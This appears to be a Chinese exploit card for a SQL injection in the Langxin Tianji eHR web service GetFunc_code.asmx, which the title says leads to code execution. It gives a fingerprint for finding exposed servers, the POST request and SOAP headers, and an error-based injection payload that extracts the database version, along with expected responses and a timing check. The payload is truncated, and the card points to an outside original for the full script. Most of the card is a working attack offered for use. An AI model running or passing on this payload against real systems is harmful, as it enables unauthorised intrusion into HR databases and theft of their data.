# 朗新天霁eHRGetFunc_code.asmxSQL注入致RCE漏洞

- **系统**：朗新天霁eHRGetFunc_code.asmxSQL注入致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/default.aspx?ReturnUrl=%2f"`
- **请求**：`POST /ws/GetFunc_code.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetMessage"`　`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetShortMessage"`　`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetMessage xmlns="http://tempuri.org/">
<a0190>-7952' OR 8812 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(107)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8812=8812) THEN @@VERSION ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(98)+CHAR(113)))-- usJo</a0190>
</GetMessage>
</soap:Body>
</soap:Envelope>
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3…（脚本共 1255 字，完整版见原文）
```
- **预期**：500 200 200　|　Copyright 响应时间>=5s 响应时间>=5s